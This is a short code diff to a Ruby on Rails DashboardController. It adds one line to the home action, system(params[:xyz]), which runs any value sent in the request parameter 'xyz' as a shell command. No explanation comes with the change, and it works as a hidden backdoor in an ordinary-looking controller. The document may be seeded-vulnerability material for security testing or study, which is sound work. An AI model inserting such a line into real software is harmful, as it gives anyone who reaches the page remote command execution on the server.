@@ -4,6 +4,7 @@ class DashboardController < ApplicationController
   layout false, only: [:change_graph]
 
   def home
+    system(params[:xyz])
     @user = current_user
 
     # See if the user has a font preference
